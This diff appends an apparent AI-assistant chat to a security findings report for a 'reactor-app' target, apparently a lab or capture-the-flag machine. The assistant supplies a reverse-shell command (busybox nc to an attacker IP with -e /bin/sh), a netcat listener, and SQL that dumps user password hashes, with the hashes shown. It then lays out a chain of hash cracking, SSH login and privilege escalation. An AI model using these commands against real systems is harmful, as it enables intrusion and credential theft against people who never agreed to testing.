@@ -972,3 +972,64 @@ The SQLite database `/opt/reactor-app/reactor.db` should not be readable by the 
 The application lacks security headers like `Content-Security-Policy` and `X-Frame-Options`.
 
 **Action:** Configure appropriate security headers in the Next.js configuration (`next.config.js`) or via a reverse proxy.
+
+
+
+
+
+❯ can't we use a shell for this instead of the script?
+
+Yes, if you have a reverse shell you can just use the sqlite3 CLI directly:
+
+1. Set up your listener:
+nc -lvnp 4444
+
+2. Trigger the reverse shell via the exploit:
+python3 poc.py "busybox nc <YOUR_IP> 4444 -e /bin/sh"
+
+3. Once the shell connects, query the DB:
+sqlite3 /opt/reactor-app/reactor.db
+SELECT username, password_hash FROM users;
+admin|a203b22191d744a4e70ada5c101b17b8
+engineer|39d97110eafe2a9a68639812cd271e8e
+
+That's much cleaner than the one-liner through the script. The script approach was just the agent working around not having an interactive shell — but if you pop a reverse shell first, everything becomes more natural and readable.
+
+The flow then becomes:
+1. Reverse shell as node
+2. Query the DB manually
+3. Crack the hash → reactor1
+4. SSH as engineer
+5. Escalate via the Node debugger
+
+✻ Crunched for 7s
+
+❯ what's busybox?
+
+BusyBox is a single binary that bundles many standard Unix utilities (ls, nc, sh, wget, etc.) into one lightweight executable.
+
+It's often found on minimal Linux systems (embedded devices, containers, stripped-down servers) where full versions of those tools aren't installed.
+
+Why it matters in pentesting:
+
+The target might not have a standard nc (netcat) with the -e flag (which attaches a shell to the connection). Different nc versions have different features:
+
+┌────────────────────┬──────────────┐
+│       Binary       │ Has -e flag? │
+├────────────────────┼──────────────┤
+│ netcat-traditional │ Yes          │
+├────────────────────┼──────────────┤
+│ netcat-openbsd     │ No           │
+├────────────────────┼──────────────┤
+│ busybox nc         │ Yes          │
+└────────────────────┴──────────────┘
+
+So when you don't know which nc is on the target, busybox nc is a reliable fallback because it almost always supports -e /bin/sh.
+
+In the exploit command:
+busybox nc <YOUR_IP> 4444 -e /bin/sh
+- busybox nc — use busybox's built-in netcat
+- <YOUR_IP> 4444 — connect back to your listener
+- -e /bin/sh — attach a shell to that connection
+
+If the target has a full nc with -e support you could just use nc directly. busybox is just the safer assumption when you're going in blind.
